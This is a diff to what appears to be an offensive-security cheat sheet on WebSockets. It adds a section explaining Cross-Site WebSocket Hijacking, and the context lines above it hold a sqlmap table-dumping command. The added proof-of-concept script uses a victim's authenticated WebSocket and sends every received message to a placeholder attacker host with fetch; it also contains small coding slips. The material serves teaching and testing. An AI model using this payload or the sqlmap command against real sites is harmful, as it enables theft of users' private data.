@@ -31,6 +31,33 @@ Then you can use any tools against the newly created web service, working as a p
 sqlmap -u http://127.0.0.1:8000/?fuzz=test --tables --tamper=base64encode --dump
 ```
 
+## Cross-Site WebSocket Hijacking (CSWSH)
+
+If the WebSocket handshake is not correctly protected using a CSRF token or a
+nonce, it's possible to use the authenticated WebSocket of a user on an
+attacker's controlled site because the cookies are automatically sent by the
+browser. This attack is called Cross-Site WebSocket Hijacking (CSWSH).
+
+Example exploit, hosted on an attacker's server, that exfiltrates the received
+data from the WebSocket to the attacker:
+
+```html
+<script>
+  ws = new WebSocket('wss://vulnerable.example.com/messages');
+  ws.onopen = function start(event) {
+    websocket.send("HELLO");
+  }
+  ws.onmessage = function handleReply(event) {
+    fetch('https://attacker.example.net/?'+event.data, {mode: 'no-cors'});
+  }
+  ws.send("Some text sent to the server");
+</script>
+```
+
+You have to adjust the code to your exact situation. E.g. if your web
+application uses a `Sec-WebSocket-Protocol` header in the handshake request,
+you have to add this value as a 2nd parameter to the `WebSocket` function call
+in order to add this header.
 
 ## References
 
